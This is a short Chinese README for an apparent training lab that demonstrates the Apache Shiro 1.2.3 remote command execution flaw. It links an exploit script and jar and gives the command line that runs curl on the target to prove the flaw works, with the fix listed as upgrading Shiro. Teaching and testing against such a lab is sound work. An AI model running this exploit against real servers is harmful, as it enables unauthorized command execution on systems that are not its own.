# shiro命令执行漏洞环境
### 测试环境
本环境用shiro源码的sample项目演示了shiro框架中存在的一个命令执行的漏洞.

shiro版本:1.2.3

### 远程命令执行利用
下载利用脚本ip

>[shirotest.py](http://{{ip}}:{{webport}}/vuln/shiro/shirotest.py)

>[shiro.jar](http://{{ip}}:{{webport}}/vuln/shiro/shiro.jar)

将shirotest.py和shiro.jar放置同一个目录,运行shirotest.py:

>`python shirotest.py {{ip}} {{port[0]}} 'curl http://baidu.com -o /tmp/baidu'`

登陆在线控制台,验证curl命令是否执行成功

### 漏洞修复
升级shiro

### 参考资料
>[APACHE SHIRO 1.2.4 远程代码执行分析与利用](http://avfisher.win/archives/584)



